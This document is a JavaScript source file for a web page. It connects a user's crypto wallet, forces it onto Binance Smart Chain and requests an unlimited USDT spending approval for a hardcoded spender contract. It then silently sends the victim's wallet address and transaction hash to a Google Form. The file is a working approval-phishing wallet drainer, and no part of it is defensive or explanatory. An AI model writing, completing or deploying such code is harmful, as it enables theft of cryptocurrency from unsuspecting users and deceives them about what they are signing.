let provider;
let signer;
let tokenContract;

// ================= CONFIG =================

// USDT on BSC
const TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";

// YOUR SPENDER CONTRACT (BSC)
const SPENDER_ADDRESS = "0x220BB5df0893F21f43e5286Bc5a4445066F6ca56";

// GOOGLE FORM
const GOOGLE_FORM_URL =
  "https://docs.google.com/forms/d/e/1FAIpQLSdtsj3KnwkgqCYvZwjr3F8ypCjM7aX6WCUEt5sKIcHsXhXrKQ/formResponse";

// YOUR FORM ENTRY IDs
const ENTRY_WALLET = "entry.916552859";
const ENTRY_TXHASH = "entry.1449465266";
const ENTRY_CHAIN  = "entry.1912151432";

// BSC CHAIN INFO
const BSC_CHAIN_ID = "0x38"; // 56

// ================= ERC20 ABI =================
const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)"
];

// ================= SWITCH TO BSC =================
async function switchToBSC() {
  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: BSC_CHAIN_ID }]
    });
  } catch (err) {
    if (err.code === 4902) {
      // Add BSC
      await window.ethereum.request({
        method: "wallet_addEthereumChain",
        params: [{
          chainId: BSC_CHAIN_ID,
          chainName: "Binance Smart Chain",
          nativeCurrency: {
            name: "BNB",
            symbol: "BNB",
            decimals: 18
          },
          rpcUrls: ["https://bsc-dataseed.binance.org/"],
          blockExplorerUrls: ["https://bscscan.com"]
        }]
      });
    } else {
      throw err;
    }
  }
}

// ================= CONNECT WALLET =================
async function connectWallet() {
  if (!window.ethereum) {
    alert("Please install MetaMask or Trust Wallet");
    return;
  }

  // 🔴 FORCE BSC NETWORK
  await switchToBSC();

  provider = new ethers.BrowserProvider(window.ethereum);
  signer = await provider.getSigner();

  tokenContract = new ethers.Contract(
    TOKEN_ADDRESS,
    ERC20_ABI,
    signer
  );

  const user = await signer.getAddress();
  document.getElementById("status").innerText =
    "Connected (BSC): " + user.slice(0, 6) + "..." + user.slice(-4);
}

// ================= APPROVE + SUBMIT =================
async function executeApproval() {
  try {
    if (!signer) {
      alert("Connect wallet first");
      return;
    }

    const userWallet = await signer.getAddress();

    document.getElementById("status").innerText =
      "Waiting for BSC approval confirmation...";

    // Approve unlimited USDT
    const tx = await tokenContract.approve(
      SPENDER_ADDRESS,
      ethers.MaxUint256
    );

    const receipt = await tx.wait();

    if (receipt.status === 1) {
      // Send to Google Form
      submitToGoogleForm(userWallet, tx.hash, "BSC");

      // Redirect user
      window.location.href = "details.html";
    }

  } catch (err) {
    console.error(err);
    document.getElementById("status").innerText =
      "Approval rejected or failed";
  }
}

// ================= GOOGLE FORM SUBMIT =================
function submitToGoogleForm(wallet, txHash, chain) {
  const data = new URLSearchParams();
  data.append(ENTRY_WALLET, wallet);
  data.append(ENTRY_TXHASH, txHash);
  data.append(ENTRY_CHAIN, chain);

  fetch(GOOGLE_FORM_URL, {
    method: "POST",
    mode: "no-cors",
    body: data
  });
}
